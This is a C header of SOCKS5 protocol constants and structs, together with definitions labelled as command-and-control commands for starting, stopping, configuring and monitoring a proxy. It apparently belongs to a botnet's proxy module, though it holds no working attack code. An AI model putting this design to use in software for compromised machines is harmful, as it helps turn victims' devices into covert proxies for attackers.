#pragma once

#include <stdint.h>

#include "includes.h"

// SOCKS5 Protocol Definitions
#define SOCKS5_VERSION 0x05
#define SOCKS5_AUTH_NONE 0x00
#define SOCKS5_AUTH_USERPASS 0x02
#define SOCKS5_AUTH_NO_ACCEPTABLE 0xFF

#define SOCKS5_CMD_CONNECT 0x01
#define SOCKS5_CMD_BIND 0x02
#define SOCKS5_CMD_UDP_ASSOCIATE 0x03

#define SOCKS5_ATYP_IPV4 0x01
#define SOCKS5_ATYP_DOMAIN 0x03
#define SOCKS5_ATYP_IPV6 0x04

#define SOCKS5_REP_SUCCESS 0x00
#define SOCKS5_REP_GENERAL_FAILURE 0x01
#define SOCKS5_REP_CONNECTION_NOT_ALLOWED 0x02
#define SOCKS5_REP_NETWORK_UNREACHABLE 0x03
#define SOCKS5_REP_HOST_UNREACHABLE 0x04
#define SOCKS5_REP_CONNECTION_REFUSED 0x05
#define SOCKS5_REP_TTL_EXPIRED 0x06
#define SOCKS5_REP_COMMAND_NOT_SUPPORTED 0x07
#define SOCKS5_REP_ADDRESS_TYPE_NOT_SUPPORTED 0x08

// CnC Protocol Commands
#define CMD_PROXY_START 0x01
#define CMD_PROXY_STOP 0x02
#define CMD_PROXY_STATUS 0x03
#define CMD_PROXY_CONFIG 0x04
#define CMD_KEEPALIVE 0x05

// Proxy Status
#define PROXY_STATUS_IDLE 0x00
#define PROXY_STATUS_RUNNING 0x01
#define PROXY_STATUS_ERROR 0x02

struct socks5_method_req {
    uint8_t version;
    uint8_t nmethods;
    uint8_t methods[255];
} __attribute__((packed));

struct socks5_method_resp {
    uint8_t version;
    uint8_t method;
} __attribute__((packed));

struct socks5_request {
    uint8_t version;
    uint8_t cmd;
    uint8_t rsv;
    uint8_t atyp;
} __attribute__((packed));

struct socks5_response {
    uint8_t version;
    uint8_t rep;
    uint8_t rsv;
    uint8_t atyp;
} __attribute__((packed));

struct socks5_auth_req {
    uint8_t version;
    uint8_t ulen;
} __attribute__((packed));

struct socks5_auth_resp {
    uint8_t version;
    uint8_t status;
} __attribute__((packed));

// CnC Communication
struct proxy_config {
    uint16_t port;
    uint8_t auth_required;
    uint8_t max_connections;
    uint32_t bandwidth_limit;
} __attribute__((packed));

struct proxy_stats {
    uint32_t connections_total;
    uint32_t connections_active;
    uint64_t bytes_sent;
    uint64_t bytes_received;
    uint32_t uptime;
} __attribute__((packed));
